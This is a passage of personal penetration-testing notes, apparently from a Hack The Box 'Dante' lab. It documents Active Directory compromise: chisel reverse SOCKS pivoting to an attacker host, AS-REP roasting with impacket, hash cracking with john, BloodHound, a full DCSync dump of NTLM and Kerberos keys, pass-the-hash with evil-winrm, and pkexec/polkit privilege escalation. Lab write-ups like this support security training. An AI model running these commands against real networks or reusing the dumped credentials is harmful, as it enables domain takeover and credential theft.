# Admin Subnet:

# Host 172.16.2.5:

I cannot figure out why I am unable to access the internal admin subnet using sshuttle. My command currently is:
```
proxychains sshuttle --dns -vr katwamba@172.16.1.20 172.16.2.0/24 --ssh-cmd "ssh -i /home/cl3al/Documents/priv_keys/id_rsa"
```

It fails stating that the path I specified for the key is not in the paths it seems to look for by default. Not sure why it does this.

SSH tunneling and SShuttle are used when SSH is available. Chisel is good for Windows and creates a tunnel from scratch where SSH may not be available. In order for me to finally be able to get an .exe file for chisel on Windows, I had to build it first with Go using the following command while in the "opt/chisel" directory:
```
GOOS=windows GOARCH=amd64 go build -ldflags="-s -w" .
```
Then:
```
#Run command on attacker machine (10.10.16.101)
./chisel server -p 8001 --reverse

#Run command on Win DC01 machine (172.16.1.20) after transferring the built chisel.exe file.
./chisel .exe client 10.10.16.101:8001 R:389:socks


```

Finally, I needed to add the new reverse proxy and the new open port to the etc/proxychains4.conf file. I figured out that the port the needed to be set in proxychains (below) and use for the remote connection above from the victim needed to be an open port. From there, I was then even able to run nmap locally on my kali machine by disabling the first proxy (commenting it out) and running **_proxychains_** before the command.:
![[./_resources/HTB_Pro_Lab_Dante.resources/image.53.png]]
**_Reference: <https://ap3x.github.io/posts/pivoting-with-chisel/>_**

**_SOMETIMES, YOU MAY NEED TO TRY DIFFERENT FORWARDED PORT UNTIL IT WORKS. 389 GAME ME ISSUES AND I HAD TO TRY 3333_**

Next, I need to conduct AS\_REP Roasting using Rubeus.exe locally on DC01 (suggested unfortunately by a discord member providing me with more help than requested). I can use an impacket tool called **_GetNPUsers_** to accomplish this and get the ticket granting ticket (TGT) using a username.:
```
proxychains impacket-GetNPUsers dante/asmith -dc-ip=172.16.2.5

and then I need to enter local password to continue when prompted.
However, I will use the following command to automate this from a file with all usernames.:

proxychains impacket-GetNPUsers dante/-no-pass -usersfile /home/cl3al/Desktop/userfile.txt -dc-ip=172.16.2.5
```

![[./_resources/HTB_Pro_Lab_Dante.resources/image.52.png]]
Nmap scan done locally as well:
![[./_resources/HTB_Pro_Lab_Dante.resources/image.54.png]]

After conducting an AS\_REP ROAST attack, I found the following TGT which can now be cracked with john!!:
```
$krb5asrep$23$jbercov@DANTE:2107e3f6021fb427d8109ae16152bd52$405302c64d77f77ae979ced680333f26c29d75bce5ec750220436dbb8648dd556236080d8b9b67e9334f5b9738ffaa70c566e0a54a1ca755ddb004a64492f7f87661473300a495f8cdf8e6466fbbf9f2521fe0f543026fbdbf27ab301d228f75c8189919b550a427988de7d3d8f135c6bef7115d62d75159fce25a8d31205b76771c52e37eac9ef7feff6af8c54259d9bcbe42fe0df9d826e09f28aa4805686f93ab96f029ae2df8a4c848a3c76978cd8fa79d9865e40f9627d10131774ee705f0f6ac8860f24c5132d0dea0a92cfec8dfb979c7afcbe7da983c83803db86a96bfd3e861
```

After using john to crack the above hash, I found the password for jbercov@dante:
```
username: dante\jbercov
password: myspace7
```

![[./_resources/HTB_Pro_Lab_Dante.resources/image.55.png]]

Next, I ran bloodhound-python to gather all information for Active Directory and the zip file is stored in my root directory. The command I used once again was.:
```
proxychains bloodhound-python -d dante.admin -v --zip -c All -u jbercov -p myspace7 -ns 172.16.2.5 --dns-tcp
```

I now need to investigate this in Bloodhound to see what I can find next. In checking, bloodhound, I see that DCsync is available for me to use for jbercov to domain admin as shown below.:

![[./_resources/HTB_Pro_Lab_Dante.resources/image.57.png]]
In searching for "dcsync" in msfconsole, I came across and used the following module which retrieved hashes.:
![[./_resources/HTB_Pro_Lab_Dante.resources/image.56.png]]

Raw Data:
```
[*] Running for 172.16.2.5...
[-] 172.16.2.5 - RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] 172.16.2.5 - Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] 172.16.2.5 - Using the DRSUAPI method to get NTDS.DIT secrets
[+] Administrator:500:aad3b435b51404eeaad3b435b51404ee:4c827b7074e99eefd49d05872185f7f8:::
[+] Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[+] krbtgt:502:aad3b435b51404eeaad3b435b51404ee:2e5f00bc433acee0ae72f622450bd63c:::
[+] DANTE.ADMIN\jbercov:1106:aad3b435b51404eeaad3b435b51404ee:2747def689b576780fe2339fd596688c:::
[+] DANTE-DC02$:1000:aad3b435b51404eeaad3b435b51404ee:ca139ee53927fb001c71aa2046260b45:::
[*] 172.16.2.5 - Kerberos keys grabbed
[+] Administrator:aes256-cts-hmac-sha1-96:0652a9eb0b8463a8ca287fc5d099076fbbd5f1d4bc0b94466ccbcc5c4a186095
[+] Administrator:aes128-cts-hmac-sha1-96:08f140624c46af979044dde5fff44cfd
[+] Administrator:des-cbc-md5:8ac752cea84f4a10
[+] krbtgt:aes256-cts-hmac-sha1-96:a696318416d7e5d58b1b5763f1a9b7f2aa23ca743ac3b16990e5069426d4bc46
[+] krbtgt:aes128-cts-hmac-sha1-96:783ecc93806090e2b21d88160905dc36
[+] krbtgt:des-cbc-md5:dcbff8a80b5b343e
[+] DANTE.ADMIN\jbercov:aes256-cts-hmac-sha1-96:5b4b2e67112ac898f13fc8b686c07a43655c5b88c9ba7e5b48b1383bc5b3a3b6
[+] DANTE.ADMIN\jbercov:aes128-cts-hmac-sha1-96:489ca03ed99b1cb73e7a28c242328d0d
[+] DANTE.ADMIN\jbercov:des-cbc-md5:c7e08938cb7f929d
[+] DANTE-DC02$:aes256-cts-hmac-sha1-96:7a7d7c0cc314fc7604749672d6e9d5feb709d765ac6e9985fffb5aaa223c5e15
[+] DANTE-DC02$:aes128-cts-hmac-sha1-96:8036c96874a8d29a122ea35c408cf660
[+] DANTE-DC02$:des-cbc-md5:a25d94f1df0b195e
```

Using evil-winrm, I was able to establish a connection to Jacob's account and found the next flag in the Desktop directory.:
```
proxychains evil-winrm -i 172.16.2.5 -u jbercov -H 2747def689b576780fe2339fd596688c  <----nthash (right one or last one from the above list)
```

I downloaded the flag.txt file as shown here.:
![[./_resources/HTB_Pro_Lab_Dante.resources/image.58.png]]
flag:
![[./_resources/HTB_Pro_Lab_Dante.resources/image.59.png]]

```
DANTE{Im_too_hot_Im_K3rb3r045TinG!}
```

I then quickly found the second flag.:
![[./_resources/HTB_Pro_Lab_Dante.resources/image.60.png]]

```
DANTE{DC_or_Marvel?}
```

I also found a note.txt file which contained the following tip regarding the previous discovery of the internal admin subnet.:
![[./_resources/HTB_Pro_Lab_Dante.resources/image.61.png]]
Lastly, I inspected the Jenkins.bat file in the Documents directory for the Administrator which revealed the following.:
![[./_resources/HTB_Pro_Lab_Dante.resources/image.62.png]]
Raw data:
```
Admin_129834765
SamsungOctober102030
```

**Host 172.16.2.101:**
![[./_resources/HTB_Pro_Lab_Dante.resources/image.93.png]]
I missed this before but in running more nmap scans, this system stands out among all other failed hosts. This is nix05 a Linux machine. Here are some more details.:
![[./_resources/HTB_Pro_Lab_Dante.resources/image.94.png]]![[./_resources/HTB_Pro_Lab_Dante.resources/image.95.png]]
\*\*\*I need to use katwamba's id\_rsa key to access the .20 DC. Then, change katwamab's password and access the machine via rdp to setup chisel and add the socks port to etc/proxychains4.conf. From there, I can continue investigating .2.101 (this nix05) machine. Comment out 9999 and uncomment 389 socks ports.\*\*\*

It seems that the only port that appears to be open is SSH as shown below.:
![[./_resources/HTB_Pro_Lab_Dante.resources/image.96.png]]

```
PORT  STATE SERVICE VERSION
22/tcp open  ssh    OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|  3072 20d08e88eedbb4cf35b7dbcb74a0500b (RSA)
|  256 db33b77b64704612290236b3c5cf963d (ECDSA)
|_  256 66bb0d63a81e4c24fe2c7e9e3a0300e6 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 39.00 seconds
```

So after getting a nude from discord, the way to access this machine is with a user and password from [172.16.1.12](http://172.16.1.12) that I saw but totally did not think much of it. The information is:
```
uname: julian
password hash: julian:$1$CrackMe$U93HdchOpEUP9iUxGVIvq/:18439:0:99999:7:::
cracked hash: manchesterunited
```

The combined unshadowed file is on the Desktop as: **_results.1.12.txt_** and just needs to be cracked with john which can take some time.

![[./_resources/HTB_Pro_Lab_Dante.resources/image.97.png]]

Vulnerable to CVE-2021-4034

Vulnerable to CVE-2021-3560

Using the first CVE once again to quickly escalate privileges, I obtained the root flag. However, I have yet to find the user flag here. Also, I saved the passwd and shadow file information to my Desktop as **_shadow.2.101.txt_** and **_passwd.2.101.txt_** respectively. I can use the unshadow command to combine both for john to then crack. Check the history for the correct command.

![[./_resources/HTB_Pro_Lab_Dante.resources/image.98.png]]
Apparently, I unintendedly escalated privs NOT through the BoF lol. I will wanna redo this so I can learn this one. Check John Hammond's video on it and also check out: <https://valsamaras.medium.com/introduction-to-x64-linux-binary-exploitation-part-1-14ad4a27aeef> for resources. Apart from that, this is the only flag on the machine apparently and the sql01 credentials are NOT here which is another conundrum. I will need to figure that out somehow.

I was able to transfer linpeas and use the following commands to perform a network enumeration scan which now allowed me to discover the [172.16.2.6](http://172.16.2.6) machine. :
```
chmod +x linpeas.sh
./linpeas.sh -d 172.16.2.0/24
```
